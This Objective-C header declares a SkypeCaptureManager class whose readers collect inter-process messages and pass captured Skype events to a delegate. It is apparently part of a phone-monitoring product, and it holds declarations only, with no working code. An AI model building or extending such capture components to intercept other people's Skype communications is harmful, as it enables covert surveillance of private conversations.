//
//  SkypeCaptureManager.h
//  SkypeCaptureManager
//
//  Created by Makara Khloth on 12/7/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "MessagePortIPCReader.h"
#import "SharedFile2IPCReader.h"
#import "DMCenterIPCReader.h"

@class SBDidLaunchNotifier;

@interface SkypeCaptureManager : NSObject <EventCapture, MessagePortIPCDelegate, SharedFile2IPCDelegate, DMCIPCDelegate> {
@private
	id <EventDelegate>		mEventDelegate;
	
	MessagePortIPCReader	*mMessagePortReader1;
	MessagePortIPCReader	*mMessagePortReader2;
	MessagePortIPCReader	*mMessagePortReader3;
	
	SharedFile2IPCReader	*mSharedFileReader1;
	
	DMCenterIPCReader		*mDMCIPCReader;
	
	SBDidLaunchNotifier		*mSBNotifier;
}

@property (nonatomic, assign) id <EventDelegate> mEventDelegate;

@end
